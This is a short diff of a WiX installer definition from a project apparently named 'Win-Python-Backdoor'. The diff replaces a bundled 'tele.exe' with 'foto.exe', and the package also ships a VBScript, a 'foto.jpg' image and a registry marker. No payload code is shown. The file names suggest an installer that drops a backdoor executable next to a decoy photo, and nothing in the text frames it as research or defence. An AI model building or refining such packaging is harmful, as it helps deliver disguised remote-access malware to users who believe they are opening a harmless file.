@@ -18,7 +18,7 @@
   
 <File Id = 'vbs_id' Name = 'svc1user.vbs' DiskId = '1' Source = 'C:\Users\Francesco\Documents\GitHub\Win-Python-Backdoor\svc1user.vbs' KeyPath = 'no' />
 <File Id = 'foto_id' Name = 'foto.jpg' DiskId = '1' Source = 'C:\Users\Francesco\Documents\GitHub\Win-Python-Backdoor\foto.jpg' KeyPath = 'no' />
-<File Id = 'tele' Name = 'tele.exe' DiskId = '1' Source = 'C:\Users\Francesco\Documents\GitHub\Win-Python-Backdoor\tele.exe' KeyPath = 'no' />
+<File Id = 'foto_id_exe' Name = 'foto.exe' DiskId = '1' Source = 'C:\Users\Francesco\Documents\GitHub\Win-Python-Backdoor\foto.exe' KeyPath = 'no' />
      
   <RegistryValue Root = "HKCU" Key = "Software\wix\wix" Name = "installed" Type = "integer" Value = "1" KeyPath = 'yes' />
 <RemoveFolder Id = "CleanUpMainFolder" On="uninstall" />
